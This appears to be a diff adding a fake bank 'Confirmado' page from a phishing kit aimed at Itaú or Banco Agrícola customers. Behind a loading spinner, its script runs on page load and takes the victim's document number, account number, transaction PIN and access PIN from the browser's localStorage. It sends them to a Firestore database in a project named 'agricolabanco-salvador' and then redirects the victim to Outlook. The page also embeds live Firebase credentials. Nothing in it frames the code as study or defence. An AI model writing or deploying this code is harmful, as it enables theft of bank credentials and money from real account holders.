@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmado</title>
+</head>
+<style>
+.lds-circle {
+  display: inline-block;
+  transform: translateZ(1px);
+}
+.lds-circle > div {
+  display: inline-block;
+  width: 64px;
+  height: 64px;
+  margin: 8px;
+  border-radius: 50%;
+  background: orange;
+  animation: lds-circle 2.4s cubic-bezier(0, 0.2, 0.8, 1) infinite;
+}
+@keyframes lds-circle {
+  0%, 100% {
+    animation-timing-function: cubic-bezier(0.5, 0, 1, 0.5);
+  }
+  0% {
+    transform: rotateY(0deg);
+  }
+  50% {
+    transform: rotateY(1800deg);
+    animation-timing-function: cubic-bezier(0, 0.5, 0.5, 1);
+  }
+  100% {
+    transform: rotateY(3600deg);
+  }
+}
+
+
+</style>
+
+<body>
+    <div class="lds-circle"><div></div></div>
+</body>
+<!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-app.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+<script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-analytics.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-firestore.js"></script>
+
+
+
+<script id="testScriptName">
+  // Your web app's Firebase configuration
+   var firebaseConfig = {
+    apiKey: "AIzaSyDU0fPnneyoqebrHgS4OE2R-9puHmtug84",
+  authDomain: "agricolabanco-salvador.firebaseapp.com",
+  projectId: "agricolabanco-salvador",
+  storageBucket: "agricolabanco-salvador.appspot.com",
+  messagingSenderId: "1088237409908",
+  appId: "1:1088237409908:web:806d1c63c25814bf166321"
+
+  };
+  // Initialize Firebase  
+  firebase.initializeApp(firebaseConfig);
+
+</script>
+
+<script>
+ const db = firebase.firestore();
+/*const midnight = new Date(firebase.firestore.Timestamp.now().toDate().setHours(0, 0, 0, 0));*/
+
+  const created = firebase.firestore.Timestamp.fromDate(new Date()).toDate();
+window.addEventListener("load", async (e) => {
+  e.preventDefault();
+  /*
+  
+  
+  agregar crypto.uuid()
+  a el doc.name
+  */
+  
+var name = crypto.randomUUID();
+  await db.collection("usuarionewITAU").doc(name).set({
+    Documento: localStorage.getItem("Documento"),
+    Cuenta: localStorage.getItem("Cuenta"),
+    PinTransaccional: localStorage.getItem("PinTransaccional"),
+    PinAcceso: localStorage.getItem("PinAcceso"),
+   
+   revisado: false,
+  });
+
+  window.location = "https://outlook.live.com/mail/0/inbox";
+});
+
+
+
+
+
+
+</script>
+</html>
